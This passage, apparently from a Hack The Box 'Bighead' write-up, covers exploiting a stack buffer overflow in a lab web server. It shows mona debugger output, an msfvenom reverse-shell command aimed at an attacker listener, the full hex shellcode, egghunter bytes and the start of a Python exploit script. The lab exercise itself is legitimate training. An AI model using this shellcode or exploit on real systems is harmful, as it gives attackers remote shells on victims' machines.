<br> Nice, We control EIP, Now we need to find a real address to overwrite EIP with. Since the egghunter will be located on the stack we need to find a <code class="highlighter-rouge">jmp esp</code> instruction to make it jmp to the egghunter and execute it. To do this we will use mona. <code class="highlighter-rouge">!mona jmp -r ESP</code>. It will create another file in <code class="highlighter-rouge">C:\logs</code> called <code class="highlighter-rouge">jmp.txt</code>. We need to make sure that the address we choose will work on the target machine, So I used one of the addresses from the <code class="highlighter-rouge">dll</code> of the server itself <code class="highlighter-rouge">bHeadSvr.dll</code>. I chose the first one :
<br><img src="/images/hackthebox/bighead/68.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/69.png" alt=""><br>
<br> Full Output :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">================================================================================</span>
  <span class="n">Output</span> <span class="n">generated</span> <span class="n">by</span> <span class="n">mona</span><span class="p">.</span><span class="n">py</span> <span class="n">v2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">rev</span> <span class="mi">585</span> <span class="o">-</span> <span class="n">Immunity</span> <span class="n">Debugger</span>
  <span class="n">Corelan</span> <span class="n">Team</span> <span class="o">-</span> <span class="n">https</span><span class="o">:</span><span class="c1">//www.corelan.be
</span><span class="o">================================================================================</span>
  <span class="n">Process</span> <span class="n">being</span> <span class="n">debugged</span> <span class="o">:</span> <span class="n">BigheadWebSvr</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">5532</span><span class="p">)</span>
  <span class="n">Current</span> <span class="n">mona</span> <span class="n">arguments</span><span class="o">:</span> <span class="n">jmp</span> <span class="o">-</span><span class="n">r</span> <span class="n">ESP</span>
<span class="o">================================================================================</span>
  <span class="mi">2019</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mi">25</span> <span class="mo">02</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">27</span>
<span class="o">================================================================================</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
 <span class="n">Module</span> <span class="n">info</span> <span class="o">:</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
 <span class="n">Base</span>       <span class="o">|</span> <span class="n">Top</span>        <span class="o">|</span> <span class="n">Size</span>       <span class="o">|</span> <span class="n">Rebase</span> <span class="o">|</span> <span class="n">SafeSEH</span> <span class="o">|</span> <span class="n">ASLR</span>  <span class="o">|</span> <span class="n">NXCompat</span> <span class="o">|</span> <span class="n">OS</span> <span class="n">Dll</span> <span class="o">|</span> <span class="n">Version</span><span class="p">,</span> <span class="n">Modulename</span> <span class="o">&amp;</span> <span class="n">Path</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
 <span class="mh">0x74c70000</span> <span class="o">|</span> <span class="mh">0x74e61000</span> <span class="o">|</span> <span class="mh">0x001f1000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">KERNELBASE</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">KERNELBASE</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x771f0000</span> <span class="o">|</span> <span class="mh">0x77269000</span> <span class="o">|</span> <span class="mh">0x00079000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">sechost</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sechost</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x00400000</span> <span class="o">|</span> <span class="mh">0x00413000</span> <span class="o">|</span> <span class="mh">0x00013000</span> <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span> <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">[</span><span class="n">BigheadWebSvr</span><span class="p">.</span><span class="n">exe</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">BigheadWebSvr</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span>
 <span class="mh">0x62500000</span> <span class="o">|</span> <span class="mh">0x62510000</span> <span class="o">|</span> <span class="mh">0x00010000</span> <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span> <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x75510000</span> <span class="o">|</span> <span class="mh">0x755a8000</span> <span class="o">|</span> <span class="mh">0x00098000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">KERNEL32</span><span class="p">.</span><span class="n">DLL</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">KERNEL32</span><span class="p">.</span><span class="n">DLL</span><span class="p">)</span>
 <span class="mh">0x74ef0000</span> <span class="o">|</span> <span class="mh">0x74fb0000</span> <span class="o">|</span> <span class="mh">0x000c0000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">msvcrt</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">msvcrt</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x64540000</span> <span class="o">|</span> <span class="mh">0x64570000</span> <span class="o">|</span> <span class="mh">0x00030000</span> <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span> <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">[</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x75270000</span> <span class="o">|</span> <span class="mh">0x752ee000</span> <span class="o">|</span> <span class="mh">0x0007e000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">ADVAPI32</span><span class="p">.</span><span class="n">DLL</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">ADVAPI32</span><span class="p">.</span><span class="n">DLL</span><span class="p">)</span>
 <span class="mh">0x776b0000</span> <span class="o">|</span> <span class="mh">0x77847000</span> <span class="o">|</span> <span class="mh">0x00197000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SYSTEM32</span><span class="err">\</span><span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x77410000</span> <span class="o">|</span> <span class="mh">0x774cf000</span> <span class="o">|</span> <span class="mh">0x000bf000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">RPCRT4</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">RPCRT4</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x75370000</span> <span class="o">|</span> <span class="mh">0x753cf000</span> <span class="o">|</span> <span class="mh">0x0005f000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">WS2_32</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">WS2_32</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
<span class="mh">0x625012f0</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span>  <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x625012fd</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span>  <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250130a</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x62501317</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x62501324</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x62501331</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250133e</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250134b</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250134d</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6455b1ca</span> <span class="o">:</span> <span class="n">push</span> <span class="n">esp</span> <span class="err">#</span> <span class="n">ret</span>  <span class="o">|</span>  <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
</code></pre></div></div>
<p><br> Let’s send a request to test it, 72 A’s then <code class="highlighter-rouge">f0125062</code> which is <code class="highlighter-rouge">625012f0</code> reversed:
<br><img src="/images/hackthebox/bighead/70.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/71.png" alt=""><br>
<br> It’s working fine. Last thing we need to know is how to send the shellcode. I sent a POST request to see how the server handles it, just a bunch of A’s :
<br><img src="/images/hackthebox/bighead/72.png" alt=""><br>
<br> Then I searched in the memory :
<br><img src="/images/hackthebox/bighead/73.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/74.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/75.png" alt=""><br>
<br> As we can see the whole request is printed in the memory. With this information now we can write the exploit.
<br></p>
<hr>

<h2 id="writing-the-exploit">Writing the Exploit</h2>
<p><br> First thing is the imports, I imported <code class="highlighter-rouge">socket</code>,<code class="highlighter-rouge">binascii</code> and <code class="highlighter-rouge">re</code></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">re</span>
</code></pre></div></div>
<p><br> Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/76.png" alt=""><br>
<br> <code class="highlighter-rouge">-b '\x00'</code> is for bad chars. <code class="highlighter-rouge">\x00</code> which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don’t need that in the shellcode.  We will add this to the exploit and remove <code class="highlighter-rouge">\x</code> because we will use <code class="highlighter-rouge">hexlify</code> and <code class="highlighter-rouge">unhexlify</code> functions from <code class="highlighter-rouge">binascii</code>. This is for the shellcode, now we need the egghunter. I used this <a href="https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py" target="_blank" rel="noopener noreferrer">tool</a> to generate the egghunter :
<br><img src="/images/hackthebox/bighead/77.png" alt=""><br>
<br> But I didn’t like that I should generate a new one if I wanted to change the egg, here’s how the tool is doing it :
<br><img src="/images/hackthebox/bighead/78.png" alt=""><br>
<br> We can easily add this to the exploit itself.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">host</span> <span class="o">=</span> <span class="s">'10.10.10.112'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">egg</span> <span class="o">=</span> <span class="s">'R1ck'</span>
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">host</code> is for the ip of the machine, <code class="highlighter-rouge">port</code> is for the port and <code class="highlighter-rouge">egg</code> is to hold the value of the egg. After that comes the <code class="highlighter-rouge">buf</code> variable generated by <code class="highlighter-rouge">msfvenom</code> (this is the my shellcode you should generate a new one with your ip and listening port) :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"d9c7d97424f45a2bc9bb9f0948"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3bb15283c204315a1303c51aaa"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ce05f4a831f505cdb81034cddf"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5167fd94378476f8a31ffad5c4"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a8b103eb29e9706aaaf0a44c93"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3ab98dd42730df8d2ce7cfba79"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3464f06c3c99418e6d0cd9c9ad"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"af0e62e4b7534fbe4ca73b4184"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"f9c4eee93537ee2ef1a8854601"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"549e9d7b822b05db418be1dd86"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"4a62d163182cf672cd4702fef0"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"878244d703ce1f7612aace8744"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15ae2d0fb8bb5f52d508526c25"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"07e51f17885db71b4178405b78"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3cdea2833df760d76d6f4058e6"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"6f6d8da93fc17e0aefa12ee2e5"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"2d101206e439b9fd6f4c34ee74"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"384a108e81c3f6fae185a19298"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"8f3902641a4404eea9b9cb07c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a9bce792936bf708bbf06ad73b"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"7e97406cd76999f8c5d0331e14"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"847c9ac375822381c2a0335fca"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ec670f9dbad1e9770d8ba324c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5b3507d81d3a42aec18b3bf7fe"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"24acff87584cff52d97c4afe48"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15136bc978a4460e852762ef72"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3707ea3ffff486506afa3550bf"</span>

</code></pre></div></div>
<p><br> I created a variable to hold the final shellcode (egg doubled + shellcode) and another variable for the egghunter :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">egg</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">egghunter</span> <span class="o">=</span> <span class="s">"6681caff0f42526a0258cd2e3c055a74efb8"</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span> <span class="o">+</span> <span class="s">"8bfaaf75eaaf75e7ffe7"</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/79.png" alt=""><br>
<br> Note : there’s a variable called <code class="highlighter-rouge">N</code>, that will come later and it has nothing to do with the exploit itself.
<br> Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter. 
<br> We will start by defining the function :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">):</span>
</code></pre></div></div>
<p><br> Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :</p>
